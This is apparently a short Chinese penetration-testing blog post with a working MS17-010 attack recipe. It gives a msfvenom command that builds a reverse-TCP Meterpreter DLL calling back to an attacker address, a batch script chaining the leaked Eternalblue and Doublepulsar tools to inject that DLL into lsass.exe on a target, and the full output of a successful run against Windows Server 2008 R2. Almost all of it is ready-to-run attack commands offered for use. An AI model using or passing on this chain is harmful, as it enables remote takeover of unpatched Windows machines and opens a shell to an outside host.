---
title: "MS17-010 Attack bat"
date: 2018-06-03T00:00:00+08:00
draft: false
tags: ['ms17-010']
categories: ['内网渗透']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

需要提取 NSA 工具包里的 Eternalblue.exe 和 Doublepulsar.exe 还有一堆必备的 xml 文件.

<!--more-->

生成 dll.

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f dll > bakdoor.dll`

bat.

```
@echo off
echo Usage: attack.bat 192.168.1.1 XP/WIN72K8R2  x86/x64 backdoor.dll
echo.
Eternalblue-2.2.0.exe --TargetIp %1 --Target %2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig log1.txt
Doublepulsar-1.3.1.exe --NetworkTimeout 60 --OutConfig log2.txt --TargetIp %1 --TargetPort 445 --DllPayload %4 --DllOrdinal 1 ProcessName lsass.exe --ProcessCommandLine --Protocol SMB --Architecture %3 --Function Rundll
```

利用成功信息.

```
> attack.bat 172.21.117.91 WIN72K8R2 x64 backdoor.dll
Usage: attack.bat 192.168.1.1 XP/WIN72K8R2  x86/x64 backdoor.dll

[*] Connecting to target for exploitation.
    [+] Connection established for exploitation.
[*] Pinging backdoor...
    [+] Backdoor not installed, game on.
[*] Target OS selected valid for OS indicated by SMB reply
[*] CORE raw buffer dump (54 bytes):
0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris
0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P
0x00000030  61 63 6b 20 31 00                                ack 1.
[*] Building exploit buffer
[*] Sending all but last fragment of exploit packet
    ................DONE.
[*] Sending SMB Echo request
[*] Good reply from SMB Echo request
[*] Starting non-paged pool grooming
    [+] Sending SMBv2 buffers
        .............DONE.
    [+] Sending large SMBv1 buffer..DONE.
    [+] Sending final SMBv2 buffers......DONE.
    [+] Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] Sending SMB Echo request
[*] Good reply from SMB Echo request
[*] Sending last fragment of exploit packet!
    DONE.
[*] Receiving response from exploit packet
    [+] ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Sending egg to corrupted connection.
[*] Triggering free of corrupted buffer.
[*] Pinging backdoor...
    [+] Backdoor returned code: 10 - Success!
    [+] Ping returned Target architecture: x64 (64-bit)
    [+] Backdoor installed
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] CORE sent serialized output blob (2 bytes):
0x00000000  08 00                                            ..
[*] Received output parameters from CORE
[+] CORE terminated with status code 0x00000000
[+] Selected Protocol SMB
[.] Connecting to target...
[+] Connected to target, pinging backdoor...
        [+] Backdoor returned code: 10 - Success!
        [+] Ping returned Target architecture: x64 (64-bit) - XOR Key: 0x31705F65
    SMB Connection string is: Windows Server 2008 R2 Enterprise 7601 Service Pack 1
    Target OS is: 2008 R2 x64
    Target SP is: 1
        [+] Backdoor installed
        [+] DLL built
        [.] Sending shellcode to inject DLL
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Command completed successfully
```